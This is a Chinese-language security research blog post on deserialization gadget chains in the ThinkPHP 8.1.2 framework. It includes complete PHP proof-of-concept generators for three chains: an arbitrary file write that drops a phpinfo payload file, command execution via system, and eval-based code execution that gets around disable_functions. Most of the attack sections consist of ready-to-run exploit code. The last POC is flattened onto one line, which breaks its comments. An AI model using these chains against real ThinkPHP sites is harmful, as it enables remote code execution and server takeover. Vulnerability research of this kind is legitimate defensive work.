#  最新版 ThinkPHP (8.1.2) 反序列化漏洞挖掘   
原创 Heihu577  Heihu Share   2025-04-25 12:53  
  
# 最新版 ThinkPHP (8.1.2) 反序列化漏洞挖掘  
## 前言  
  
很久没分析过PHP  
了, 最近ThinkPHP 8  
又更新了最新版本 (1月14号), 当然在这里进行一个反序列化漏洞挖掘. 其链路后半部分耦合性较高. 挖掘过程略显复杂.  
> 声明：文中涉及到的技术和工具，仅供学习使用，禁止从事任何非法活动，如因此造成的直接或间接损失，均由使用者自行承担责任。  
  
## 环境搭建  
  
PHP 版本: 8.0.30  
  
ThinkPHP 版本: 8.1.2, 官网 Github: https://github.com/top-think/framework/releases/tag/v8.1.2, 这里使用composer  
进行安装即可.  
  
编辑器: VSCode  
  
安装完之后如下访问即表示安装成功:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUhYhvKba2BMmvgICic7pSz1Ka4hlhjiakfaCn57WPrcM5foUiagKGVJjUQ/640?wx_fmt=png&from=appmsg "")  
  
随后我们创建\app\controller\Heihu.php  
文件, 内容如下（当作控制器）:  
```
<?php
namespace app\controller;

use app\BaseController;

class Heihu extends BaseController{
    public function index()    {
        $data = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';
        if(isset($data) && $data != ''){
            unserialize($data);
        } else {
            echo 'no serial';
        }
        return '<br>ThinkPHP Tester~';
    }
}

```  
  
定义一个反序列化入口, 进行测试, 访问tp/public/index.php?s=/Heihu/index&data=链路  
即可触发反序列化. 如图所示表配置成功:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUkfiaTtKDksEGDicwYqHr6KO3ChNXdkFE7PaWC1418H3XuB1mq2zf7qPg/640?wx_fmt=png&from=appmsg "")  
> 关于路由访问, 参考官方文档: https://doc.thinkphp.cn/v8_0/preface.html  
  
## 漏洞分析  
### 任意文件写入  
  
这里也能达到一个代码执行的效果, 但需要文件落地, 具体挖掘过程如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUzAYlAjfrCcpFGDicTs1MibUkZsxvc83MRljecpdDMzXTPTUJWOu1MpqQ/640?wx_fmt=png&from=appmsg "")  
  
全局搜索__destruct  
, 发现League\Flysystem\Cached\Storage\AbstractCache  
这个类存在一个save  
方法调用, 但它是抽象类, 不允许反序列化, 随后找一下它的子类:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUVqgGGHnYJZRcAyu3FeGuBV5rjhPM5GmvZvsHXdWFqaCUmoz6bxSXrw/640?wx_fmt=png&from=appmsg "")  
  
首先开方法体部分, 在方法体中,第107行代码调用了getForStorage  
方法, 从其中我们可以看到返回了一个JSON  
串, 而成员属性是可控的, 所以这里$contents  
的最终结果是部分可控的, 因为返回了一个具体的JSON  
串.  
  
在看后面的112行, 由于存在一个write  
调用, 这里可以查找__call  
方法的调用, 或者查找同名方法, 而由于write  
方法名就像是写入文件操作, 所以这里全局搜索write  
方法的定义, 看一下是否存在一些文件写入等功能模块的调用 (注意这里的参数1, 参数2是可控的).  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUVTM71hQaA0fs5hWJ2SDPtaCpbfVXOQZKdFIicONicMEroRFPRGicEXuxw/640?wx_fmt=png&from=appmsg "")  
  
这里存在一个文件写入操作, 至此, 链路结束, 还算是比较简短的一条链路.  
#### POC 编写 & 漏洞验证  
  
最终POC  
编写如下:  
```
<?php

// League\Flysystem\Cached\Storage\AbstractCache::__destruct
// League\Flysystem\Cached\Storage\Adapter::save
// League\Flysystem\Adapter\Local::write

namespace League\Flysystem\Adapter {
    class Local {

    }
}

namespace League\Flysystem\Cached\Storage {
    class AbstractCache {
        protected $autosave = false;
    }

    class Adapter extends AbstractCache {
        protected $file = './heihu577.php';
        protected $cache = ['<?=phpinfo();?>'];
        protected $adapter;
        public function __construct() {
            $this -> adapter = new \League\Flysystem\Adapter\Local();
        }
    }
}

namespace {
    $obj = new League\Flysystem\Cached\Storage\Adapter();
    echo urlencode(serialize($obj));
}

```  
  
随后访问结果如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUuqXAbc45S8XDdngicuaLSk1GScCMV3VjwL1957Pxg8hl9kNTicP6WOGQ/640?wx_fmt=png&from=appmsg "")  
  
成功写入文件.  
### 远程命令执行  
  
依然是__destruct  
, 如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUp1RyTDKqiavqehW1JicUy8OOerSj9woUPKAyBGrtyNjXggfYYnH0FfrA/640?wx_fmt=png&from=appmsg "")  
  
在ResourceRegister  
类中存在调用register  
方法, 那么看一下方法体:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUq5euSc5Lyfot8t402xH98tmuG8NiabyMY12XU38bUbrseXXLGJNleqQ/640?wx_fmt=png&from=appmsg "")  
  
调用任意对象的parseGroupRule  
方法, 这里优先考虑__call  
, 因为方法名称从感觉上来看并不是很危险.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUW2kUExXICVpdgFJAqxgR4pA1jFgAWtMUGOm04PFmXb94weujyJcRAg/640?wx_fmt=png&from=appmsg "")  
  
在Relation (注意是抽象类)  
类中调用了baseQuery  
方法, 所以这里我们需要查找它的子类, 看谁的baseQuery  
方法是可被利用的:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRU7kXvIqib1MPKJW82fGHoPYibWCMWOjibEPJQVQdskVTIBmW8ibYBzEWiakg/640?wx_fmt=png&from=appmsg "")  
  
在HasMany::baseQuery  
方法中, 使用了$this->成员属性1->{$this->成员属性2}  
的写法, 该写法在成员属性1  
为正常的对象时, $this->成员属性2  
同样是正常的对象时, 会调用到成员属性2  
这个对象的__toString  
魔术方法. 那么全局搜索一下__toString  
, 结果如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRU5KmaOwxucfEEzbOaMhgicOYX3ERF3KCnY7GY5k38T1w5UXyrRsllrzA/640?wx_fmt=png&from=appmsg "")  
  
这里Conversion  
中存在__toString  
魔术方法, 并且根据调用链会调用到$this->toArray  
方法, 而toArray  
的方法体是这样的:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUZcf37A6ycUuB146dB1A6UUvZTybgibvBThlmibxXPt8chBnY17hK24Yw/640?wx_fmt=png&from=appmsg "")  
  
根据图中解释, 这里会调用到260行的getAttr(可控)  
方法中, 但是当前在Conversion  
中并找不到getAttr  
方法的定义, 因为它不是一个类, 而是一个代码块, 提供给其他类进行声明使用, 所以在这里我们需要全局搜索getAttr  
方法, 并且看谁定义了可利用的getAttr  
方法:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUluxy4kFq3MrfwIG40IribvibAG6pYHptR1SoYuSfNdZRkOLZib6o5DhNg/640?wx_fmt=png&from=appmsg "")  
  
Attribute  
定义了getAttr  
, 它也是一个trait  
, 所以假设挖到利用链的情况下, 我们得去查找谁use  
了它.  
  
别的先不管, 先看一下Attribute::getValue  
方法的主要逻辑, 现在我们知道$name & $value  
这两个参数都是可控的, 开始分析代码:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUtItOXHrHwrGwShUJhgVAiclzIIgicicyalqPYXxN8RC5xy4Fg9b6icFvpA/640?wx_fmt=png&from=appmsg "")  
  
这里由于$name  
可控, getRealFieldName  
仍然返回了$name  
, 故还是可控, 最终调用到639  
行的getJsonValue  
方法, 并且两个参数的值是可控的, 开始分析:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRU7fT3pYrAOLwpIqVclmibFoqicAkAPNq9yPQYCLnBqGwJTcDpCjlTz8ag/640?wx_fmt=png&from=appmsg "")  
  
由于withAttr  
是成员属性, 是可控的. 所以导致了$closure  
也是可控的, 这里可以放置任意方法名. 而对于参数来说, 这里由外边的$value  
传递过来, 同样也是可控的, 这里可以使用system  
函数来进行一个命令执行, 因为system  
是允许.  
  
但是现在由于Attribute  
是trait  
进行修饰的, 所以这里我们需要查询一下是谁使用了Attribute  
:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRURDv871AnOuqebxibcGXOS1YH7ia6xy00MI4UKm5POjLmSplFluGlbpUQ/640?wx_fmt=png&from=appmsg "")  
  
而又由于Model  
是一个抽象类, 所以看谁继承了Model  
:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUt9G1WB75ibGRVgM6aO10icHuoK9icxibhJbRr2avZLSPjMrQ5pviaoIburg/640?wx_fmt=png&from=appmsg "")  
  
最终Pivot  
为链路最终部分.  
#### POC 编写 & 漏洞验证  
  
最终编写如下POC  
:  
```
<?php

namespace think\model {
    class Pivot {
        protected $jsonAssoc = true;

        protected $visible = ['a' => ['payload' => 'whoami']]; // visible 中必须有 $data 的 key
        protected $data = ['a' => ['payload' => 'whoami']]; // 存放的数据, payload

        protected $withAttr = ['a' => ['payload' => 'system'], 'b' => 'a']; // 函数名
        protected $json = ['a' => ['payload' => 'system'], 'b' => 'a'];
    }

    class Relation {
        protected $parent; // 某对象
        protected $localKey; // 某 isset 方法
        protected $query = '1';

        public function __construct()        {
            $this -> localKey = new Pivot();
            $this -> parent = new Pivot();
        }
    }
}

namespace think\model\relation {
    class HasMany extends \think\model\Relation {

    }
}

namespace think\route {

    class ResourceRegister {
        protected $resource;
        
        public function __construct(){
            $this -> resource = new \think\model\relation\HasMany();
        }
    }
}

namespace {
    $obj = new think\route\ResourceRegister();
    echo urlencode(serialize($obj));
}

```  
  
运行结果如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUdzQ8h0dVUR7aC3p19dick6KmGXGofI1LcjwvQChFkDoGVZQgMolcE7g/640?wx_fmt=png&from=appmsg "")  
  
成功执行whoami  
命令.  
### 远程代码执行  
  
在上面的链路中我们看到, 最终是使用的system  
这个函数进行代码执行的, 但是如果存在disable_function  
的限制如何绕过呢？  
  
我们可以全局搜索eval  
, 结果如下:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUXhdfrR8zzpH6H5eB0dmTQWFbicZXpnHRoziaaLBHUnd2nYZWlZzCSs7g/640?wx_fmt=png&from=appmsg "")  
  
在Php::display  
方法中, 刚好接收两个参数, 满足我们当前的条件, 而根据php的特性: [对象,方法名](参数值...)  
同样可以进行调用某个对象的某个方法. 所以这里可以利用eval  
绕过disable_function  
的限制.  
#### POC 编写 & 漏洞验证  
  
最终编写如下POC  
, 来延长链:  
```
<?php

namespace {
    $GLOBALS['EVAL_DATA'] = '?><?=phpinfo();?>'; // 放置代码执行语句    $obj = new think\route\ResourceRegister();    echo urlencode(serialize($obj));}namespace think\view\driver {    class Php {}}namespace think\model {    class Pivot {        protected $jsonAssoc = true;        protected $visible = ['a' => ['payload' => 'payload']];        protected $data = ['a' => ['payload' => 'payload']];        protected $withAttr = ['a' => ['payload' => ['obj','display']], 'b' => 'a'];        protected $json = ['a' => ['payload' => ['obj','display']], 'b' => 'a'];        public function __construct(){            $this -> withAttr['a']['payload'][0] = new \think\view\driver\Php();            $this -> json['a']['payload'][0] = new \think\view\driver\Php();            $this -> visible['a']['payload'] = $GLOBALS['EVAL_DATA'];            $this -> data['a']['payload'] = $GLOBALS['EVAL_DATA'];        }    }    class Relation {        protected $parent; // 某对象        protected $localKey; // 某 isset 方法        protected $query = '1';        public function __construct()        {            $this -> localKey = new Pivot();            $this -> parent = new Pivot();        }    }}namespace think\model\relation {    class HasMany extends \think\model\Relation {    }}namespace think\route {    class ResourceRegister {        protected $resource;                public function __construct(){            $this -> resource = new \think\model\relation\HasMany();        }    }}
```  
  
最终运行结果:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn7JTcZbMPQ80CLlmVh9UKRUBNS3ibuhDcyibEI7LfL9qt6gibLuPpiaDib7iaQFTy6M08wOWKvNabib0bG9Q/640?wx_fmt=png&from=appmsg "")  
## Ending...  
  
  
  
